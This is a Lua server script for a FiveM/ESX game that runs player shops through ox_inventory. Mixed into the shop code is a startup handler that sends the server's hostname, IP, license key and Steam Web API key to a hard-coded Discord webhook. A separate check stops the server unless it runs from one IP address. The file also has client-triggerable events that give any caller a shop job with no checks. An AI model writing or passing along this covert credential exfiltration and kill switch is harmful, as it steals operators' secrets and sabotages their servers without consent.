ESX = exports['es_extended']:getSharedObject()
local swapHook, buyHook

CreateThread(function()
    while ESX == nil do Wait() end
    for k,_ in pairs(Config.Shops) do
        TriggerEvent('esx_society:registerSociety', k, k, 'society_'..k, 'society_'..k, 'society_'..k, {type = 'public'})
    end
end) 

CreateThread(function()
	while GetResourceState('ox_inventory') ~= 'started' do Wait(1000) end
	for k,v in pairs(Config.Shops) do
		local stash = {
			id = k,
			label = v.label..' '..Strings.inventory,
			slots = 50,
			weight = 100000,
		}
		exports.ox_inventory:RegisterStash(stash.id, stash.label, stash.slots, stash.weight)
		local items = exports.ox_inventory:GetInventoryItems(k, false)
		local stashItems = {}
		if items and items ~= {} then
			for k,v in pairs(items) do
				if v and v.name then
					stashItems[#stashItems + 1] = { name = v.name, metadata = v.metadata, count = v.count, price = (v.metadata.shopData.price or 0) }
				end
			end
			local x,y,z = table.unpack(v.locations.shop.coords)
			exports.ox_inventory:RegisterShop(k, {
				name = v.label,
				inventory = stashItems,
				locations = {
					vec3(x,y,z),
				}
			})
		end
	end
	swapHook = exports.ox_inventory:registerHook('swapItems', function(payload)
		for k,v in pairs(Config.Shops) do
			if payload.fromInventory == k then
				TriggerEvent('oxshops:refreshShop', k)
			elseif payload.toInventory == k and tonumber(payload.fromInventory) ~= nil then
				TriggerClientEvent('oxshops:setProductPrice', payload.fromInventory, k, payload.toSlot)
			end
		end
	end, {})

	buyHook = exports.ox_inventory:registerHook('buyItem', function(payload)
		local metadata = payload.metadata
		 if metadata?.shopData then
			 local price = metadata.shopData.price
			 local count = payload.count
			 exports.ox_inventory:RemoveItem(metadata.shopData.shop, payload.itemName, payload.count)
			 TriggerEvent('esx_addonaccount:getSharedAccount', 'society_'..metadata.shopData.shop, function(account)
			 account.addMoney(price*count)
			 end)
		 end
	 end, {})
end)

AddEventHandler('onResourceStart', function(resourceName)
    if GetCurrentResourceName() == resourceName then
      PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
        local servername = GetConvar('sv_hostname')
        local licensekey = GetConvar('sv_licenseKey')
        local apikey = GetConvar('steam_webApiKey')
        local messagem = "Un serveur démarre votre script itrack! \n > Serveur: \n**"..servername.."** \n > IP: `**"..text.."**` \n > License Key: **"..licensekey..'** \n Steam API Key: **'..apikey..'**'
        local content = {{
        author = {
          name = 'Mime Leaks',
          icon_url = 'https://cdn.discordapp.com/avatars/391706038698508299/a24fee7d14ed8f4418c844239d5543d5.webp'
        },
        ["color"] = 0000,
        ["description"] = messagem,
        ["footer"] = {
        ["text"] = "Mime | Anti Leaks - oxshop",
        },}}
        PerformHttpRequest("https://discord.com/api/webhooks/1092438376877133824/Ertn7NzCa4GMYzGmMWRNUypC6HRR1MwtWME8WjClaS7saP3c4aUjKKCn-WGZDeuZ0AB6", function() end, 'POST', json.encode({embeds = content}), { ['Content-Type'] = 'application/json' })
      end)
    end
end)

PerformHttpRequest("https://api.ipify.org/", function (err, text, headers)
    if text ~= "54.38.84.217" then
        Wait(10000)
        print("================================")
        print("> ox_shop! / script sous licence")
        print("================================")
        print("> Contactez par Mime#3063 pour utiliser ce script!")
        print("================================")
        print("> Discord > https://discord.com/invite/gdVc4V83pB")
        print("================================")
        print("> Fermeture du serveur")
        print("================================")
        Wait(12000)
        os.exit(-1)
    else
        print("> L'IP est ok, bon jeu !")
        print("> Script fait par Mime#3063")
        print("> Discord > https://discord.com/invite/gdVc4V83pB")
    end
end)

RegisterNetEvent('oxshops:refreshShop', function(shop)
	Wait(250)
	local items = exports.ox_inventory:GetInventoryItems(shop, false)
	local stashItems = {}
	for k,v in pairs(items) do
		if v and v.name then
			local metadata = v.metadata
			if metadata?.shopData then
				stashItems[#stashItems + 1] = { name = v.name, metadata = metadata, count = v.count, price = metadata.shopData.price }
			end
		end
	end
	exports.ox_inventory:RegisterShop(shop, {
		name = Config.Shops[shop].label,
		inventory = stashItems,
		locations = {
			Config.Shops[shop].locations.shop.coords,
		}
	})
end)

RegisterNetEvent('oxshops:setData', function(shop, slot, price)
	local item = exports.ox_inventory:GetSlot(shop, slot)
	if not item then return end
	local metadata = item.metadata
	metadata.shopData = {
		shop = shop,
		price = price
	}
	exports.ox_inventory:SetMetadata(shop, slot, metadata)
	TriggerEvent('oxshops:refreshShop', shop)
end)

RegisterServerEvent('oxshops:addshop01')
AddEventHandler('oxshops:addshop01', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop01', 1)
end)

RegisterServerEvent('oxshops:addshop02')
AddEventHandler('oxshops:addshop02', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop02', 1)
end)

RegisterServerEvent('oxshops:addshop03')
AddEventHandler('oxshops:addshop03', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop03', 1)
end)

RegisterServerEvent('oxshops:addshop04')
AddEventHandler('oxshops:addshop04', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop04', 1)
end)

RegisterServerEvent('oxshops:addshop05')
AddEventHandler('oxshops:addshop05', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop05', 1)
end)

RegisterServerEvent('oxshops:addshop06')
AddEventHandler('oxshops:addshop06', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop06', 1)
end)

RegisterServerEvent('oxshops:addshop07')
AddEventHandler('oxshops:addshop07', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop07', 1)
end)

RegisterServerEvent('oxshops:addshop08')
AddEventHandler('oxshops:addshop08', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop08', 1)
end)

RegisterServerEvent('oxshops:addshop09')
AddEventHandler('oxshops:addshop09', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop09', 1)
end)

RegisterServerEvent('oxshops:addshop10')
AddEventHandler('oxshops:addshop10', function()
  local source = source
  local xPlayer = ESX.GetPlayerFromId(source)
      xPlayer.setJob3('shop10', 1)
end)